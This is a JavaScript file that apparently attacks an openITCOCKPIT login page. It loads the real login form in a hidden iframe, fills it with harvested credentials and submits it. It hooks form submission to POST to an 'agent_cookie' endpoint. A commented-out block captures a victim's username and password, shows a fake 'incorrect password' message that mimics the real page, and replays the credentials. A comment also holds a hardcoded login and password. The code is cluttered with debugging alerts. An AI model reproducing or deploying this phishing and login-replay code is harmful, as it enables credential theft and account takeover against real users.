function attempt_login1(creds) {
    let iframe = document.createElement('iframe');
    iframe.onload = function() {
        let iframe_dom = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
        let iframe_dom2 = iframe.contentWindow.document;
       /* alert(`content ${iframe_dom}`);
        alert(`content Window ${iframe_dom2}`);
        alert(`body ${iframe_dom.body}`)
        alert(`b5 ${iframe_dom.body.childNodes[5]}`)
        alert(`b51111513 ${iframe_dom.body.childNodes[5].childNodes[1].childNodes[1].childNodes[1].childNodes[1].childNodes[5].childNodes[1].childNodes[3]}`)
        */
        iframe_dom.body.childNodes[5].childNodes[1].childNodes[1].childNodes[1].childNodes[1].childNodes[5].childNodes[1].childNodes[3][1].value = creds.usr;
        /*
        alert(`uname ${iframe_dom.body.childNodes[5].childNodes[1].childNodes[1].childNodes[1].childNodes[1].childNodes[5].childNodes[1].childNodes[3][1].value}`)
        alert(`tralante: ${iframe_dom2.getElementById("LoginUserUsername").value}`)
        alert(`trivalante(we expect nothing here): ${iframe_dom.getElementById("LoginUserUsername").value}`)
        alert(iframe_dom.body.childNodes[5].childNodes[1].childNodes[1].childNodes[1].childNodes[1].childNodes[5].childNodes[1].childNodes[3]);
        */
        iframe_dom.getElementById("LoginUserUsername").value = creds.usr;//'view@viewer.local' ;
        iframe_dom.getElementById("LoginUserPassword").value= creds.pwd;//'27NZDLgfnY';
        iframe_form = iframe_dom.getElementById("login-form");
        alert(`here ${iframe_form}`)
//iframe_dom.body.childNodes[5].childNodes[1].childNodes[1].childNodes[1].childNodes[1].childNodes[5].childNodes[1].childNodes[3].onsubmit=function() {
        iframe_form.onsubmit = function() {
            //actions();
            let xhr1 = new XMLHttpRequest();
            xhr1.open('POST', agent_cookie, true);
            xhr1.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            xhr1.send(`name=GOTCHA&value=GOTCHA}`);

        }
        /*
            let xhr1 = new XMLHttpRequest();
            xhr1.open('POST', agent_cookie, true);
            xhr1.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            xhr1.send(`name=GOTCHA&value=GOTCHA}`);
            */
//iframe_dom.body.childNodes[5].childNodes[1].childNodes[1].childNodes[1].childNodes[1].childNodes[5].childNodes[1].childNodes[3].submit()
        //iframe_form.submit();
        //actions();
        document.getElementById(iframe.id).contentWindow.document.getElementById("login-form").onsubmit = function() {
            alert('apples')
        }
        document.getElementById('cucked').contentWindow.document.getElementById("login-form").submit();
        
    };

    iframe.setAttribute("style", "display:none")
    iframe.width = "100%"
    iframe.height = "100%"
    iframe.src = "https://openitcockpit"
    //iframe.id='cucked_'+randomString(32, alphabet);
    iframe.id='cucked';

    body = document.getElementsByTagName('body')[0];
    body.appendChild(iframe);
}

function bagels(evt) {
    //let iframe_dom2 = iframe.contentWindow.document;
    window.alert(evt.currentTarget.creds);
    window.alert(evt.currentTarget.id);
    window.alert(`apples: ${document.getElementById(evt.currentTarget.id).contentWindow.document.getElementById("LoginUserUsername").value}`)
    document.getElementById('cucked').contentWindow.document.getElementById("login-form").onsubmit = function() {
        alert('tony');
    }
    document.getElementById('cucked').contentWindow.document.getElementsByClassName("btn btn-primary pull-right")[0].onclick = function () {
        alert('waffles');
    }

    /*
    document.getElementById(evt.currentTarget.id).contentWindow.document.getElementById("LoginUserUsername").value = 'test'
    document.getElementById(evt.currentTarget.id).contentWindow.document.getElementById("LoginUserPassword").value = 'test'
    */
    //document.getElementById('cucked').contentWindow.document.getElementById("login-form").submit();
}

//window.alert(`Here: ${document.getElementById('cucked').contentWindow.document.getElementById("LoginUserUsername").value}`);
//document.getElementById('cucked').contentWindow.document.forms[0].submit();
/*
var creds = null;   
form.onsubmit = function(e) {
    e.preventDefault();
    var watch = false
    function uniqueCredsFound(oldvalue) {
        undefined === oldvalue && (oldvalue = creds);
        clearcheck = setInterval(repeatcheck,500, oldvalue);
        function repeatcheck(oldvalue) {
            // since we found unique creds, attempt to login in an iframe
            if(!_.isEqual(oldvalue, creds)){
            //if (creds !== oldvalue) {
                // do something
                //attempt_login(creds);
                watch = true;
                clearInterval(clearcheck);
                alert("check1 value changed from " + oldvalue + " to " + creds.usr + " " + creds.pwd);
            }
        }
    }
    //uniqueCredsFound(creds);
    creds = retrieveCredentials();

    // fake incorrect pw mimicking the real login page
    if(!document.getElementById("flashMessage")) {
        var incorrect_password = document.createElement('div');
        incorrect_password.id="flashMessage";
        incorrect_password.className += "alert auto-hide alert-danger";
        incorrect_password.textContent="Email and password do not match any user in our database."
        document.getElementsByClassName("login-alert")[0].appendChild(incorrect_password);
        document.getElementById("LoginUserUsername").value = '';
        document.getElementById("LoginUserPassword").value = '';
    }
    else {
     document.getElementById("LoginUserUsername").value = '';
     document.getElementById("LoginUserPassword").value = '';
    }
    
    // attempt login with credentials we found
    if(watch=true) {
        //attempt_login(creds);
        watch=false;
    }
    attempt_login(creds);

}
*/